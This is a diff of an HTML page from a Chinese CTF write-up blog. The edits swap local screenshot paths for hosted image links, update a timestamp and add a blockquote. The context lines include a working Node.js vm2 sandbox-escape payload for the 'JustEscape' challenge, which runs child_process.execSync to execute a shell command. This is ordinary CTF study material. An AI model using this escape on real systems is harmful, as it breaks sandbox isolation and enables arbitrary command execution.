@@ -41,9 +41,9 @@
 <meta property="og:site_name" content="glotozz&#39;blog">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://i.loli.net/2020/04/19/feHQjrUblK57D1G.png">
-<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-20_00-04-57.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/20/Won7EZiaVG8b5zw.png">
 <meta property="article:published_time" content="2020-04-19T11:21:38.000Z">
-<meta property="article:modified_time" content="2020-04-19T16:11:53.457Z">
+<meta property="article:modified_time" content="2020-04-19T16:18:56.938Z">
 <meta property="article:author" content="glotozz">
 <meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary">
@@ -176,7 +176,9 @@
 
 <p>登录得到flag</p>
 <h3><span id="justescape">JustEscape</span></h3><p>nodejs的vm逃逸</p>
+<blockquote>
 <p><a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/225</a> </p>
+</blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">        Buffer.from(new Proxy(&#123;&#125;, &#123;</span><br><span class="line">            getOwnPropertyDescriptor()&#123;</span><br><span class="line">                throw f&#x3D;&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;));</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">         e(()&#x3D;&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <p>数组绕过过滤</p>
@@ -188,7 +190,7 @@
 <p>需要最前面加个<code>%08</code>字符</p>
 <p>本地测试成功，但是题目环境打不通</p>
 <p>本地环境关闭了源码显示，未修改session存储引擎，注释了 <code>safe_delete($filename);</code> </p>
-<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-20_00-04-57.png" alt="Snipaste_2020-04-20_00-04-57"></p>
+<p><img src="https://i.loli.net/2020/04/20/Won7EZiaVG8b5zw.png" alt="Snipaste_2020-04-20_00-04-57.png"></p>
 <p>迷</p>
 
             </div>
